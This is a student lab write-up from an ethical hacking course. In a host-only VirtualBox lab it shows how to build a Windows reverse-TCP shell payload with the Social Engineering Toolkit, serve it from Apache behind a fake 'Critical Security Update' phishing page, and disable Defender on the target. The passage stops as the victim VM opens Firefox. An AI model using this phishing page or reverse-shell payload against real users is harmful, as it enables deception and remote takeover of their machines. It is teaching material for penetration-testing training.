<div style="display: flex; justify-content: space-between; align-items: center;">
  <span style="text-align: left;">Horacio Gonzalez</span>
  <span style="text-align: center;"><strong>SET and Armitage</strong></span>
  <span style="text-align: right;">ICT450 Ethical Hacking</span>
</div>

#### **Overview**
In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit, and Armitage for exploiting a Windows 8.1 machine. The steps include importing the Windows machine into VirtualBox, creating a reverse shell payload, hosting the payload using a phishing webpage, and using Armitage to exploit the system and gain control of the target machine.



#### **1. Environment Setup**
##### **1.1 Import the Windows 8.1 Machine into VirtualBox**
1. Open VirtualBox and navigate to **File** -> **Import Appliance**.
2. Select the `.ova` file for the Windows 8.1 virtual machine.
3. Follow the prompts and ensure the virtual machine is configured to use **Host-Only Adapter**.
4. Start the Windows 8.1 VM and log in with the following password:
   - **Password:** `AggiesR0ck$`

5. Open Windows Defender, go to settings, disable Real Time Protection and Save changes.
5. Open a terminal in Kali Linux and update the system:
   ```bash
   sudo apt update -y && sudo apt full-upgrade -y
    ```
6. Start required services in Kali:
    ```
    sudo systemctl start apache2
    ```
7. Verify the services are running:
    ```
    sudo systemctl status apache2
    ```

#### **2. Using the Social Engineering Toolkit (SET) In Kali**
##### 2.1 Launch SET
1. We will start by launching SET, open a terminal and type:
   ```
   sudo setoolkit
    ```
2. From the SET menu select `1) Social Engineering Attacks` and click enter (just enter the number and enter), then select `4) Create a Payload and Listener`. 

3. Then we will select the payload type, so enter `4) Windows Shell Reverse_TCP x64`    

4. Configure the payload:
   1. LHOST: Enter the IP of your Kali machine `(192.168.56.4)` 
   2. LPORT: `443`
5. Allow SET to generate the payload but `do not` start the listener yet.
6. Leave the terminal as it is and open a new terminal.

#### In a New Terminal
##### 2.2 Host the Payload,
1. Move the payload to the Apache web directory:
    ```
    sudo mv /root/.set/payload.exe /var/www/html/shPayload.exe
    ```
2. Verify the payload is in the correct directory:
    ```
    ls /var/www/html
    ```

##### 2.3 Create a Phishing Webpage
1. Create a fake HTML page to trick users into downloading the payload:
    ```
    echo '<html>
    <head><title>Important Update</title></head>
    <body>
    <h1>Critical Security Update</h1>
    <p>Click the link below to download the update:</p>
    <a href="shPayload.exe">Download Update</a>
    </body>
    </html>' | sudo tee /var/www/html/index.html
    ```
2. Verify the page is correctly saved:
    ```
    cat /var/www/html/index.html
    ```
3. Restart the Apache server to serve the payload and the webpage:
    ```
    sudo systemctl restart apache2
    ```

##### 2.4 Go back to the terminal with the payload we haven't started
1. Go back to the SET terminal and enter `yes` and hit Enter to start the payload listener.
2. SET will now wait for the reverse shell connection.
3. We can open a new terminal and check the ports open with
    ```
    netstat -plnt
    ```
4. Go back to the Metasploit terminal

##### 2.5 Go to the Windows machine
1. Inside the Windows machine open Firefox
